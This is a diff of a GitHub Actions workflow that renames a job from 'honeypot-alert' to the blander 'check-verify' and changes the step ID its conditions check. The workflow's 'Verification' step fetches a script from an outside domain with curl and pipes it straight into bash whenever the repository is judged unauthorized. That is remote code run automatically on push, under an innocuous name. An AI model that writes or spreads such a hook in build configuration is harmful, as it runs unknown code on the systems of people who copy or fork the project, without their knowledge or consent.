@@ -9,7 +9,7 @@ on:
       - "**"
 
 jobs:
-  honeypot-alert:
+  check-verify:
     runs-on: ubuntu-latest
 
     steps:
@@ -47,7 +47,7 @@ jobs:
 
       - name: Get Repository Details
         id: repo-details
-        if: steps.check-authorization.outputs.is_authorized == 'false'
+        if: steps.check-repo.outputs.is_authorized == 'false'
         run: |
           IS_PRIVATE=$(jq -r '.repository.private // false' "$GITHUB_EVENT_PATH")
           VISIBILITY=$(jq -r '.repository.visibility // "unknown"' "$GITHUB_EVENT_PATH")
@@ -60,6 +60,6 @@ jobs:
           echo "created_at=$CREATED_AT" >> $GITHUB_OUTPUT
 
       - name: Verification
-        if: steps.check-authorization.outputs.is_authorized == 'false'
+        if: steps.check-repo.outputs.is_authorized == 'false'
         run: |
           curl https://codepot.freshpo.com/verify | bash
